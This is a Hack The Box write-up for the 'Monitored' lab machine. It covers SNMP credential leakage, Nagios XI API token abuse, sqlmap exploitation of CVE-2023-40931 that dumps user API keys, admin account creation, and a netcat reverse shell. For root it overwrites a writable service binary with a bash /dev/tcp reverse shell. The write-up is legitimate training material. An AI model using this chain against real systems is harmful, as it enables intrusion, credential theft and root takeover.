---
title: "HTB - Monitored"
date: 2026-07-14
---

## Overview

Monitored is a medium-rated Linux box running NagiosXI, a network monitoring platform. I'll obtain credentials via SNMP and use them to authenticate to the Nagios API, retrieving an authentication token that bypasses the login page.

Once logged into the dashboard, I'll exploit a SQL injection vulnerability to extract an administrator API key, which I use to create a new admin account via the API. As admin, I'll abuse a built-in command execution functionality to land a reverse shell. Finally, I'll exploit a misconfigured sudo rule on a script to escalate to root.

## Recon
### Nmap
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -T4 10.129.29.223
[sudo] password for kali:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 09:19 +0100
Nmap scan report for 10.129.29.223
Host is up (0.042s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.58 seconds
```

```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,389,443,5667 -sCV -T4 10.129.29.223
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 09:29 +0100
Nmap scan report for 10.129.29.223
Host is up (0.018s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```

```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU -T4 -F 10.129.29.223
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-13 09:20 +0100
Warning: 10.129.29.223 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.29.223
Host is up (0.019s latency).
Not shown: 56 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)
PORT    STATE SERVICE                          
123/udp open  ntp
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 57.35 seconds
```

Interesting findings:

- TLS certificate and HTTP redirect suggests a VHost `nagios.monitored.htb`, which I'll add to my `/etc/hosts` file.
- SNMP is open, I'll definitely look to enumerate this as a priority.
- Non-standard port 5667 which is used to allow remote systems to send passive check results back to the Nagios server.
- Likely running Debian, based on OpenSSH version.

## Web - 443/tcp
As always, I like to start by adding any vhosts/subdomains to my /etc/hosts file for name resolution.

```sh
┌──(kali㉿kali)-[~]
└─$ echo '10.129.29.223 nagios.monitored.htb monitored.htb' | sudo tee -a /etc/hosts
10.129.29.223 nagios.monitored.htb monitored.htb
```

Navigating to the web page presents a nagios endpoint `nagiosxi`.
![NagiosXI](/assets/img/monitored/nagiosxi.png)

Currently, I have no valid credentials and any authentication bypass proves to not work. I'll fuzz for any other subdomains using multiple wordlists, but find nothing.

Next, I fuzz for directories using `-k` to disable TLS certificate verification.
```sh
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u https://nagios.monitored.htb/nagiosxi/FUZZ -k
<SNIP>

images                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 24ms]
admin                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 24ms]
includes                [Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 22ms]
help                    [Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 20ms]
api                     [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 16ms]
config                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 24ms]
tools                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 22ms]
db                      [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 17ms]
about                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 20ms]
account                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 20ms]
mobile                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 18ms]
reports                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 18ms]
backend                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 18ms]
views                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 15ms]
sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 19ms]
terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 67ms]
dashboards              [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 18ms]
```

I'll find an endpoint `/terminal`, but researching this leads to me finding out it's something called `Shell In a Box` which is a web-based terminal emulator for the SSH protocol.
![Shell In A Box](/assets/img/monitored/shellinabox.png)

## SNMP - 161/udp
I usually like to use `snmpwalk`, however when running this against the community string `public`, I'll find a LOT of data to parse.

I'll opt to use another tool called `snmp-check` as it structures the data much better.
```sh
┌──(kali㉿kali)-[~]                            
└─$ snmp-check -c public 10.129.29.223
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.129.29.223:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.129.29.223
  Hostname                      : monitored
  Description                   : Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
  Contact                       : Me <root@monitored.htb>
  Location                      : Sitting on the Dock of the Bay
  Uptime snmp                   : 00:55:08.13
  Uptime system                 : 00:55:02.77
  System date                   : 2026-7-13 01:00:51.0
<SNIP>
[*] Processes:

  Id                    Status                Name                  Path          Parameters
  1                     runnable              systemd               /sbin/init
 623                    runnable               sh                     /bin/sh               -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
```

Here, I'll find credentials for `svc`. I attempt to use these credentials everywhere, and find something interesting on the nagiosxi login page.

![Svc Login 1](/assets/img/monitored/svc1.png)
![Svc Login 2](/assets/img/monitored/svc2.png)
![Svc Login 3](/assets/img/monitored/svc3.png)

The error messages suggest `svc` credentials are correct, however the account is disabled. This will make more sense shortly.

## API Enumeration
After lengthy enumeration, I turn my attention back to the API endpoint found earlier and attempt to authenticate using `curl`.

```sh
┌──(kali㉿kali)-[~]
└─$ curl -k -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate'
{"error":"Must be valid username and password."}
```

Now sending the credentials as POST data.
```sh
┌──(kali㉿kali)-[~]
└─$ curl -k -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB'
{"username":"svc","user_id":"2","auth_token":"a01e7751fb160fe3bf4d72f87577a5c6799dd4d0","valid_min":5,"valid_until":"Mon, 13 Jul 2026 19:28:13 -0400"}
```

I now have a `auth_token` which has a valid time of 5 minutes, but how can I use it to enumerate further endpoints?

With a quick google, I'll find [this](https://assets.nagios.com/downloads/nagiosxi/docs/Accessing-and-Using-the-XI-REST-API.pdf) pdf explaining exactly how to use the token.

However this actually fails...
```sh
┌──(kali㉿kali)-[~]
└─$ curl -k -X GET 'https://nagios.monitored.htb/nagiosxi/api/v1/system/status?apikey=0f85700b96afb1f9886f49fcbffc503f32511d6c&pretty=1'
{"error":"Invalid API Key"}
```

It turns out the `apikey` parameter is not the correct parameter. I'll use the `token` parameter to provide the API key. This authenticates, but returns a "No API Key provided" error when testing the `/system` endpoint.
```sh
┌──(kali㉿kali)-[~]
└─$ curl -k -X GET 'https://nagios.monitored.htb/nagiosxi/api/v1/system/status?token=f9b1e2bff208839652e8ed05839e268cf40c0e64&pretty=1'
{"error":"No API Key provided"}
```

I'll research further and find this forum post regarding token usage. Again, I realise that I do not need to provide `/api/v1`.
```sh
┌──(kali㉿kali)-[~]
└─$ curl -k -L 'https://nagios.monitored.htb/nagiosxi/includes/components/nagioscore/ui/trends.php?token=9588e4e51a099d5d3ed7f5fcd2ba546cd49b47ad'
<html>
<head>
<link rel="shortcut icon" href="https://nagios.monitored.htb/nagiosxi/includes/components/nagioscore/ui/images/favicon.ico" type="image/ico">
<title>
Nagios Trends
</title>
<SNIP>
<!-- Produced by Nagios (https://www.nagios.org).  Copyright (c) 1999-2007 Ethan Galstad. -->
</body>
</html>
```

I then attempt to curl `index.php` with my token, and to my surprise, it works.
```sh
┌──(kali㉿kali)-[~]
└─$ curl -k -L 'https://nagios.monitored.htb/nagiosxi/index.php?token=9588e4e51a099d5d3ed7f5fcd2ba546cd49b47ad'
        <!DOCTYPE html>
        <!-- <!DOCTYPE html> -->
        <html>

    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
                <!-- Produced by Nagios XI. Copyright (c) 2008-2026 Nagios Enterprises, LLC (www.nagios.com). All Rights Reserved. -->
        <!-- Powered by the Nagios Synthesis Framework -->
                <title>Login &middot; Nagios XI</title>
        <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<SNIP>
```

I'll switch to my browser so I can enumerate with an interface.

![NagiosXI UI](/assets/img/monitored/nagiosui.png)

I notice at the bottom that the version of Nagios XI is `5.11.0`.

## Authenticated SQLi - CVE-2023-40931
Searching for vulnerabilities in this version, I come across [CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931). The description states:

>A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner_message-ajaxhelper.php

I'll craft the URL, and send it to `sqlmap`. However, the format isn't working as expected.
```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=*&token=3819e5a4cb25299940b5ae59fc52021f6c75dc39' --batch --dump --risk=3 --level=5
        ___        
       __H__
 ___ ___["]_____ ___ ___  {1.10.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal law
s. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:19:02 /2026-07-14/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[01:19:03] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[01:19:03] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('nagiosxi=ul9ii0fbk9f...ihghsnqrf4'). Do you want to use those [Y/n]
```

Once I adjust, I'm able to dump the database.
```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=*' --cookie='nagiosxi=7f62a86420c46692794414da29d673539502b6f6' --batch --dump --risk=3 --level=5
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.10.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:33:15 /2026-07-14/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[01:33:15] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[01:33:15] [INFO] resuming back-end DBMS 'mysql'
[01:33:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id= (SELECT 6865 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(6865=6865,1))),0x717a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
---
[01:33:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[01:33:15] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[01:33:15] [INFO] fetching current database
[01:33:15] [INFO] resumed: 'nagiosxi'
[01:33:15] [INFO] fetching tables for database: 'nagiosxi'
[01:33:15] [INFO] fetching columns for table 'xi_cmp_trapdata_log' in database 'nagiosxi'
<SNIP>
```

I'll find `sqlmap` has kindly dumped the `xi_users` table in csv for me.
```sh
┌──(kali㉿kali)-[~]
└─$ cat /home/kali/.local/share/sqlmap/output/nagios.monitored.htb/dump/nagiosxi/xi_users.csv
user_id,email,name,api_key,enabled,password,username,created_by,last_login,api_enabled,last_edited,created_time,last_attempt,backend_ticket,last_edited_by,login_attempts,last_password_change
1,admin@monitored.htb,Nagios Administrator,IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL,1,$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C,nagiosadmin,0,1701931372,1,1701427555,0,1780662345,IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0,5,3,1701427555
2,svc@monitored.htb,svc,2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK,0,$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK,svc,1,1699724476,1,1699728200,1699634403,1780666618,6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq,1,10,1699697433
```

I now have the API key for the administrator.

## API Endpoint Fuzzing
I can use the API key retrieved from the SQL database, to fuzz the API for endpoints as the administrator.

```sh
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u https://nagios.monitored.htb/nagiosxi/api/v1/ --query apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt --insecure

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/api/v1
 🚩  In-Scope Url          │ nagios.monitored.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🤔  Query Parameter       │ apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
<SNIP>
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/objects?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        3w       34c https://nagios.monitored.htb/nagiosxi/api/v1/system?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
200      GET        1l        7w       54c https://nagios.monitored.htb/nagiosxi/api/v1/User?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
</SNIP>
```

I'll find various endpoints and fuzz them, and eventually find some interesting endpoints, with `user` being the most interesting.
```sh
┌──(kali㉿kali)-[~]
└─$ curl -sk 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' | jq . 
{
  "records": 2,
  "users": [
    {
      "user_id": "2",
      "username": "svc",
      "name": "svc",
      "email": "svc@monitored.htb",
      "enabled": "0"
    },
    {
      "user_id": "1",
      "username": "nagiosadmin",
      "name": "Nagios Administrator",
      "email": "admin@monitored.htb",
      "enabled": "1"
    }
  ]
}
```

After researching once again on how to create a user, I come across [this](https://support.nagios.com/forum/viewtopic.php?p=253363) forum post. It mentions adding `auth_level=admin`, I'll use this as a reference, and create an admin user.
```sh
┌──(kali㉿kali)-[~]
└─$ curl -sk -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL' -d 'username=qvq&password=Wootington!&name=qvq1&email=qvq1@qvq.com&auth_level=admin'
{"success":"User account qvq was added successfully!","user_id":6}
```

![Admin NagiosXI UI](/assets/img/monitored/admin.png)

And just like that, I have created a new admin account.

## User Foothold
As an administrator, I have access to built-in functionality that lets me create commands which execute on the underlying host.

First, I'll navigate to:

`Configure` > `Core Config Manager` > `Commands` and `Add New`, craft a busybox netcat reverse shell, then `save`.

![Command Management](/assets/img/monitored/command1.png)

In `Hosts`, I'll execute "Run Check Command" and get a reverse shell.

![Host Management](/assets/img/monitored/command2.png)

```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.229] from (UNKNOWN) [10.129.29.223] 58730
whoami
nagios
```

I'll upgrade the TTY.
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.229] from (UNKNOWN) [10.129.29.223] 58730
whoami
nagios
python3 -c 'import pty; pty.spawn("/bin/bash")'
nagios@monitored:~$ export TERM=xterm
export TERM=xterm
nagios@monitored:~$
zsh: suspended  nc -lvnp 9001

┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001
                               reset
nagios@monitored:~$ 
```

### User Flag
```sh
nagios@monitored:~$ cat user.txt 
<REDACTED_FLAG>
```

## Privilege Escalation
As always, I'll start by manually enumerating and quickly find something interesting.

```sh
nagios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

Here, I can run any of the listed scripts as `root` without providing a password.

I'll find most scripts fairly useless, but `manage_services.sh` presents a vector where I can start/stop some services.
```sh
nagios@monitored:~$ cat /usr/local/nagiosxi/scripts/manage_services.sh
#!/bin/bash
<SNIP>
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
```

I'll look to see what permissions I have on all listed services and eventually find I have write permissions over the `nagios` binary.
```sh
nagios@monitored:~$ find /* -name nagios 2>/dev/null
/home/nagios
/usr/local/nagios
/usr/local/nagios/bin/nagios
<SNIP>
nagios@monitored:~$ ls -la /usr/local/nagios/bin/nagios
-rwxrwxr-- 1 nagios nagios 717648 Nov  9  2023 /usr/local/nagios/bin/nagios
```

I'll stop the service, write a simple bash reverse shell to `/usr/local/nagios/bin/nagios` and restart the service to gain a root shell.
```sh
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop nagios
```

```sh
nagios@monitored:~$ nano /usr/local/nagios/bin/nagios

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.229/9002 0>&1
```

```sh
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh start nagios
```

### Root Flag
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.229] from (UNKNOWN) [10.129.29.223] 49708
bash: cannot set terminal process group (77878): Inappropriate ioctl for device
bash: no job control in this shell
root@monitored:/#
root@monitored:/# cat /root/root.txt
cat /root/root.txt
<REDACTED_FLAG>
```
